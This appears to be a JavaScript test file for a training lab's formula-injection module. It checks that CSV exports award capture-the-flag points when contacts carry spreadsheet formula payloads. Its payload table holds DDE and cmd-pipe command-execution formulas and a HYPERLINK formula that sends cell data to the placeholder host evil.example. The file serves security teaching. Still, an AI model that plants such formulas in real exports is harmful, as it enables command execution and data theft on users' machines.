'use strict';
// Formula module: every challenge must be solvable by smuggling a spreadsheet
// formula trigger through the CSV export, and a plain contact must award
// nothing. All four challenge routers register the same /add and /export.csv
// paths, so the export must classify and award every matching vuln.
const test = require('node:test');
const assert = require('node:assert/strict');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

const PAYLOADS = {
  'formula-csv': "=cmd|' /C calc'!A0",
  'formula-dde': '=DDE("cmd";"/C calc")',
  'formula-hyperlink': '=HYPERLINK("http://evil.example/?"&A1,"click")',
  'formula-pipe': "|'cmd'!A0",
};
const NAMES = {
  'formula-csv': 'formula:Classic Formula Injection',
  'formula-dde': 'formula:DDE Command Execution',
  'formula-hyperlink': 'formula:HYPERLINK Exfiltration',
  'formula-pipe': 'formula:Pipe Prefix (LibreOffice)',
};

test('formula module', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const flagOf = (id) => flagFromDb(dataDir, 'formula', id);

  async function addContact(c, name, note) {
    const r = await c.post('/formula/add', { name, note: note || '' });
    assert.equal(r.status, 302, 'adding a contact should redirect back');
  }

  async function xFlags(c) {
    const r = await c.get('/formula/export.csv');
    assert.equal(r.status, 200, 'export should download');
    assert.ok(r.headers.get('content-type').includes('text/csv'), 'export should be CSV');
    return r.headers.get('x-flags') || '';
  }

  await t.test('module page renders, links resolve, no em dash, no flag leak', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/formula');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash in page');
    assert.equal((text.match(/class="vuln-card"/g) || []).length, 4);
    assert.equal((text.match(FLAG_RE) || []).length, 0);
    for (const href of ['/formula#formula-csv', '/formula#formula-dde', '/formula#formula-hyperlink', '/formula#formula-pipe', '/formula/export.csv']) {
      const r = await c.get(href.split('#')[0]);
      assert.notEqual(r.status, 404, href);
    }
    const add = await c.post('/formula/add', { name: 'Link Check', note: '' });
    assert.notEqual(add.status, 404, '/formula/add');
  });

  await t.test('benign contact: no payload, no export trick, no flag', async () => {
    const c = client(srv.base);
    await addContact(c, 'Bob Tester', 'likes spreadsheets');
    const flags = await xFlags(c);
    assert.equal(flags, '', 'a plain contact must not award any flag');
    const got = (await capturedSet(c)).filter((s) => s.startsWith('formula:'));
    assert.deepEqual(got, [], 'scoreboard must show no formula captures');
  });

  await t.test('formula-csv: payload without export awards nothing, export awards the flag', async () => {
    const c = client(srv.base);
    await addContact(c, PAYLOADS['formula-csv'], 'classic');
    const before = (await capturedSet(c)).filter((s) => s.startsWith('formula:'));
    assert.deepEqual(before, [], 'storing the payload alone must not award');
    const flags = await xFlags(c);
    assert.ok(flags.includes(flagOf('formula-csv')), 'export with =cmd| cell must award formula-csv');
    assert.ok((await capturedSet(c)).includes(NAMES['formula-csv']));
  });

  await t.test('formula-dde: DDE payload in the export earns the flag', async () => {
    const c = client(srv.base);
    await addContact(c, PAYLOADS['formula-dde'], 'dde');
    const flags = await xFlags(c);
    assert.ok(flags.includes(flagOf('formula-dde')), 'export with =DDE( cell must award formula-dde');
    assert.ok((await capturedSet(c)).includes(NAMES['formula-dde']));
  });

  await t.test('formula-hyperlink: HYPERLINK payload in the export earns the flag', async () => {
    const c = client(srv.base);
    await addContact(c, PAYLOADS['formula-hyperlink'], 'link');
    const flags = await xFlags(c);
    assert.ok(flags.includes(flagOf('formula-hyperlink')), 'export with =HYPERLINK( cell must award formula-hyperlink');
    assert.ok((await capturedSet(c)).includes(NAMES['formula-hyperlink']));
  });

  await t.test('formula-pipe: pipe-prefixed payload in the export earns the flag', async () => {
    const c = client(srv.base);
    await addContact(c, PAYLOADS['formula-pipe'], 'pipe');
    const flags = await xFlags(c);
    assert.ok(flags.includes(flagOf('formula-pipe')), 'export with | cell must award formula-pipe');
    assert.ok((await capturedSet(c)).includes(NAMES['formula-pipe']));
  });

  await t.test('scoreboard counts each captured challenge exactly once', async () => {
    const c = client(srv.base);
    for (const id of Object.keys(PAYLOADS)) {
      await addContact(c, PAYLOADS[id], 'sweep');
    }
    await xFlags(c);
    await xFlags(c);
    const got = (await capturedSet(c)).filter((s) => s.startsWith('formula:'));
    assert.equal(got.length, 4);
    for (const id of Object.keys(PAYLOADS)) {
      assert.equal(got.filter((s) => s === NAMES[id]).length, 1, NAMES[id]);
    }
  });
});
